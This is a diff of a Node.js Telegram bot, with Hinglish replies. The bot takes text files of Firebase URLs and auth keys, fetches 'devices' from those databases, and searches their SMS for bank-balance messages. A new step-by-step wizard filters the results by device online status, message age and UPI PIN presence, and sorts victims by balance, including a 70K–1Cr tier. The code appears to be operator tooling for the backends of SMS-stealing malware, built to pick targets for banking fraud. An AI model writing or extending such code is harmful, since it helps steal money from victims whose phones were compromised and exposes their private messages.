@@ -1,15 +1,28 @@
 #!/usr/bin/env node
 import { Telegraf, Input } from 'telegraf';
-import { readFileSync, existsSync, mkdirSync, writeFileSync } from 'fs';
+import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'fs';
 import { join } from 'path';
 import { parseTxtCredentials, fetchAllPanels } from './lib/panelCore.mjs';
 import { parseSearchCommand, runSearch, searchHelpText } from './lib/searchRunner.mjs';
+import {
+  extractSearchKeywords,
+  tierFromRest,
+  optsFromWizard,
+  statusKeyboard,
+  daysKeyboard,
+  pinKeyboard,
+  sortKeyboard,
+  dayLabel,
+  statusLabel,
+  pinLabel,
+} from './lib/searchWizard.mjs';
 
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const DATA_DIR = process.env.BOT_DATA_DIR || join(process.cwd(), '.bot-data');
 const PANELS_FILE = join(DATA_DIR, 'panels.json');
 const USER_PANELS = new Map();
 const SEARCH_ABORT = new Map();
+const SEARCH_WIZARD = new Map();
 
 if (!TOKEN) {
   console.error('TELEGRAM_BOT_TOKEN missing. See BOT-START-HI.md');
@@ -40,10 +53,9 @@ const bot = new Telegraf(TOKEN);
 bot.start(ctx => {
   ctx.reply(
     '✅ Already authorized!\n\n' +
-      '📩 .txt file bhejo (caption: `addtxt` ya `/fb`)\n' +
-      '🔎 `/search` — commands\n' +
-      '⚡ `/search avl/bal, bank online`\n' +
-      '🏦 `/searchbank` — 70K–1Cr\n' +
+      '📩 .txt + caption `addtxt` / `/fb`\n' +
+      '🔎 `/search` — menu\n' +
+      '⚡ `/search avl/bal, bank online` → tap options\n' +
       '/status · /done',
     { parse_mode: 'Markdown' }
   );
@@ -55,7 +67,7 @@ bot.command('status', ctx => {
   ctx.reply(
     `Total panels (A–Z): *${globalPanels.length}*\n` +
       `Auth key wale: ${withKey} | Sirf URL: ${globalPanels.length - withKey}\n` +
-      `Last search/fetch devices: ${cached?.devices?.length ?? 0}`,
+      `Last search devices: ${cached?.devices?.length ?? 0}`,
     { parse_mode: 'Markdown' }
   );
 });
@@ -73,41 +85,52 @@ bot.command('add', async ctx => {
   for (const p of found) map.set(p.url.toLowerCase(), p);
   globalPanels = [...map.values()];
   savePanels(globalPanels);
-  const added = globalPanels.length - before;
-  ctx.reply(`✅ ${added} naye add (total: ${globalPanels.length})`);
+  ctx.reply(`✅ ${globalPanels.length - before} naye (total: ${globalPanels.length})`);
 });
 
 bot.on('document', async ctx => {
   const cap = (ctx.message.caption || '').toLowerCase();
   if (!cap.includes('addtxt') && !cap.includes('/fb') && cap !== 'fb') {
-    return ctx.reply(
-      '📩 Send me a .txt with your firebases!\nCaption: `addtxt` ya `/fb`\n\nFormat: URL + auth (mixed text OK)',
-      { parse_mode: 'Markdown' }
-    );
+    return ctx.reply('Caption: `addtxt` ya `/fb`', { parse_mode: 'Markdown' });
   }
   try {
     const link = await ctx.telegram.getFileLink(ctx.message.document.file_id);
     const res = await fetch(link.href);
     const text = await res.text();
     const found = parseTxtCredentials(text);
-    if (!found.length) return ctx.reply('File mein Firebase URL+key nahi mila.');
+    if (!found.length) return ctx.reply('File mein Firebase nahi mila.');
     const before = globalPanels.length;
     const map = new Map(globalPanels.map(p => [p.url.toLowerCase(), p]));
     for (const p of found) map.set(p.url.toLowerCase(), p);
     globalPanels = [...map.values()];
     savePanels(globalPanels);
-    const added = globalPanels.length - before;
     ctx.reply(
-      `📂 File se *${found.length}* firebases mile, *${added}* naye add hue\n` +
-        `Total tumhare personal DBs: *${globalPanels.length}*`,
+      `📂 ${found.length} firebases · ${globalPanels.length - before} naye\nTotal: *${globalPanels.length}*`,
       { parse_mode: 'Markdown' }
     );
   } catch (e) {
-    ctx.reply('File read fail: ' + e.message);
+    ctx.reply('File fail: ' + e.message);
   }
 });
 
-async function executeSearch(ctx, commandText) {
+function startSearchWizard(ctx, rest, isBankHigh = false) {
+  const keywords = extractSearchKeywords(rest);
+  SEARCH_WIZARD.set(ctx.from.id, {
+    keywords,
+    tier: tierFromRest(rest, isBankHigh),
+    status: null,
+    days: null,
+    pin: null,
+    sort: null,
+  });
+  const kw = keywords.join(', ');
+  return ctx.reply(
+    `🔎 Search setup\n📌 Keywords: *${kw}*\n\n*Step 1/4* — Device status choose karo:`,
+    { parse_mode: 'Markdown', ...statusKeyboard() }
+  );
+}
+
+async function executeSearch(ctx, opts) {
   if (!globalPanels.length) {
     return ctx.reply('Pehle `addtxt` se panels add karo.', { parse_mode: 'Markdown' });
   }
@@ -116,14 +139,14 @@ async function executeSearch(ctx, commandText) {
     return ctx.reply('Pehle /done bhejo ya wait karo.');
   }
   SEARCH_ABORT.set(uid, 'running');
-  const opts = parseSearchCommand(commandText);
-  const status = await ctx.reply('⚡ Search start ho rahi hai...\n📌 avl/bal, bank');
+  const kw = (opts.keywords || ['avl/bal', 'bank']).join(', ');
+  const status = await ctx.reply(`⚡ Search start...\n📌 ${kw}`);
 
   const abort = () => SEARCH_ABORT.get(uid) !== 'running';
   try {
     const out = await runSearch(globalPanels, opts, prog => {
       if (abort()) return;
-      let msg = '⚡ Search chal rahi hai...';
+      let msg = '⚡ Search...';
       if (prog.phase === 'panels') {
         msg = `📥 DBs ${prog.done}/${prog.total} · ${prog.count} devices`;
       } else if (prog.phase === 'sms') {
@@ -137,9 +160,10 @@ async function executeSearch(ctx, commandText) {
       return;
     }
 
-    const pinLbl = opts.pinBoth ? '🔄 Both (mix)' : 'PIN filtered';
+    const pinLbl = opts.pinBoth ? '🔄 Both (mix)' : opts.pinOnly ? '✅ With PIN' : '❌ Without PIN';
     const onlineLbl = opts.bothStatus ? '🔄 Both' : opts.online ? '🟢 Online' : '⚫ Offline';
-    const sortLbl = out.tier.label.includes('LOW') ? '💰 Low->High' : '💰 High->Low';
+    const sortLbl = out.tier.label.includes('LOW->HIGH') ? '💰 Low→High' : '💰 High→Low';
+    const dayLbl = opts.days === 0 ? 'All time' : `Last ${opts.days} days`;
 
     const fname = `sms_avlbal_bank_${Date.now()}.txt`;
     await ctx.replyWithDocument(Input.fromBuffer(Buffer.from(out.text, 'utf8'), fname));
@@ -148,13 +172,13 @@ async function executeSearch(ctx, commandText) {
       ctx.chat.id,
       status.message_id,
       undefined,
-      `✅ Done! avl/bal, bank | ${onlineLbl} | ${pinLbl} | ${sortLbl} | Last ${opts.days} days.\n` +
+      `✅ Done! ${kw} | ${onlineLbl} | ${pinLbl} | ${sortLbl} | ${dayLbl}\n` +
         `📊 ${out.stats.sms} matches in ${(out.elapsed / 1000).toFixed(0)}s\n` +
-        '📄 File sent above ☝️\n' +
-        `Firebase+Device ID TXT · DBs: ${out.stats.panelsHit}/${globalPanels.length}`
+        '📄 File sent above ☝️'
     );
 
     USER_PANELS.set(uid, { devices: out.results, at: Date.now(), search: opts });
+    SEARCH_WIZARD.delete(uid);
   } catch (e) {
     await ctx.telegram
       .editMessageText(ctx.chat.id, status.message_id, undefined, '❌ ' + e.message)
@@ -170,28 +194,100 @@ bot.command('search', async ctx => {
   if (!rest) {
     return ctx.reply(searchHelpText(), { parse_mode: 'Markdown' });
   }
-  await executeSearch(ctx, text);
+  if (/\bnow\b/i.test(rest)) {
+    return executeSearch(ctx, parseSearchCommand(text));
+  }
+  await startSearchWizard(ctx, rest, false);
 });
 
 bot.command('searchbank', async ctx => {
   const text = ctx.message.text.trim();
-  if (!/^\/searchbank\s+\S/i.test(text)) {
-    return ctx.reply('🏦 Bank 70K–1Cr:\n`/searchbank bank online`', { parse_mode: 'Markdown' });
+  const rest = text.replace(/^\/searchbank\s*/i, '').trim();
+  if (!rest) {
+    return ctx.reply('🏦 `/searchbank bank online` → tap steps', { parse_mode: 'Markdown' });
   }
-  await executeSearch(ctx, text);
+  if (/\bnow\b/i.test(rest)) {
+    return executeSearch(ctx, parseSearchCommand(text));
+  }
+  await startSearchWizard(ctx, rest || 'bank', true);
+});
+
+bot.action(/^sw\|st\|(online|offline|both)$/, async ctx => {
+  await ctx.answerCbQuery();
+  const w = SEARCH_WIZARD.get(ctx.from.id);
+  if (!w) {
+    return ctx.reply('Pehle `/search avl/bal, bank online` bhejo', { parse_mode: 'Markdown' });
+  }
+  w.status = ctx.match[1];
+  SEARCH_WIZARD.set(ctx.from.id, w);
+  await ctx.reply(
+    `✅ ${statusLabel(w.status)}\n\n*Step 2/4* — Kitne din purane SMS?`,
+    { parse_mode: 'Markdown', ...daysKeyboard() }
+  );
+});
+
+bot.action(/^sw\|day\|(\d+)$/, async ctx => {
+  await ctx.answerCbQuery();
+  const w = SEARCH_WIZARD.get(ctx.from.id);
+  if (!w?.status) return ctx.reply('Pehle Step 1 (Online/Offline) choose karo.');
+  w.days = parseInt(ctx.match[1], 10);
+  SEARCH_WIZARD.set(ctx.from.id, w);
+  await ctx.reply(
+    `✅ ${dayLabel(w.days)}\n\n*Step 3/4* — UPI PIN filter:`,
+    { parse_mode: 'Markdown', ...pinKeyboard() }
+  );
+});
+
+bot.action(/^sw\|pin\|(with|without|both)$/, async ctx => {
+  await ctx.answerCbQuery();
+  const w = SEARCH_WIZARD.get(ctx.from.id);
+  if (!w?.status || w.days === null || w.days === undefined) {
+    return ctx.reply('Pehle days choose karo.');
+  }
+  w.pin = ctx.match[1];
+  SEARCH_WIZARD.set(ctx.from.id, w);
+  await ctx.reply(
+    `✅ PIN: ${pinLabel(w.pin)}\n\n*Step 4/4* — Sort + Start:`,
+    { parse_mode: 'Markdown', ...sortKeyboard() }
+  );
+});
+
+bot.action(/^sw\|sort\|(low|high)$/, async ctx => {
+  await ctx.answerCbQuery();
+  const w = SEARCH_WIZARD.get(ctx.from.id);
+  if (!w?.pin) return ctx.reply('Pehle PIN step complete karo.');
+  w.sort = ctx.match[1];
+  if (w.sort === 'high') w.tier = w.tier === 'bank70k' ? 'bank70k' : 'high_low';
+  else w.tier = 'low_high';
+  SEARCH_WIZARD.set(ctx.from.id, w);
+  const kw = w.keywords.join(', ');
+  await ctx.reply(
+    `Sort: ${w.sort === 'low' ? 'Low→High' : 'High→Low'}\n\n` +
+      `📋 ${kw} | ${statusLabel(w.status)} | ${dayLabel(w.days)} | ${pinLabel(w.pin)}\n` +
+      'Neeche *START SEARCH* dabao 👇',
+    { parse_mode: 'Markdown', ...sortKeyboard() }
+  );
+});
+
+bot.action(/^sw\|go\|start$/, async ctx => {
+  await ctx.answerCbQuery('Search start...');
+  const w = SEARCH_WIZARD.get(ctx.from.id);
+  if (!w?.status || w.days === null || w.days === undefined || !w.pin) {
+    return ctx.reply('Poora wizard complete karo (status → days → PIN).');
+  }
+  if (w.sort === 'high' && w.tier !== 'bank70k') w.tier = 'high_low';
+  if (!w.sort) w.tier = w.tier || 'low_high';
+  await executeSearch(ctx, optsFromWizard(w));
 });
 
 bot.command('fb', ctx => {
-  ctx.reply(
-    '📩 Mujhe .txt bhejo caption `fb` ya `addtxt` ke saath.\n' +
-      `Abhi loaded panels: *${globalPanels.length}*`,
-    { parse_mode: 'Markdown' }
-  );
+  ctx.reply(`📩 .txt + \`fb\` caption · Panels: ${globalPanels.length}`, { parse_mode: 'Markdown' });
 });
 
 bot.command('done', ctx => {
   SEARCH_ABORT.delete(ctx.from.id);
-  ctx.reply(`✅ Total panels: ${globalPanels.length}\nAb /search chalao.`);
+  SEARCH_WIZARD.delete(ctx.from.id);
+  ctx.reply(`✅ Panels: ${globalPanels.length}\n/search se wizard start karo.`);
 });
 
 bot.command('fetch', async ctx => {
@@ -224,13 +320,13 @@ bot.command('fetch', async ctx => {
 
 bot.command('online', ctx => {
   const cached = USER_PANELS.get(ctx.from.id);
-  if (!cached?.devices?.length) return ctx.reply('Pehle /search ya /fetch.');
+  if (!cached?.devices?.length) return ctx.reply('Pehle /search.');
   const online = cached.devices.filter(d => d.status);
-  ctx.reply(`Online: ${online.length} (cached ${cached.devices.length})`);
+  ctx.reply(`Online: ${online.length}`);
 });
 
 bot.launch();
-console.log('Panel search bot polling...');
+console.log('Panel search bot (wizard) polling...');
 
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
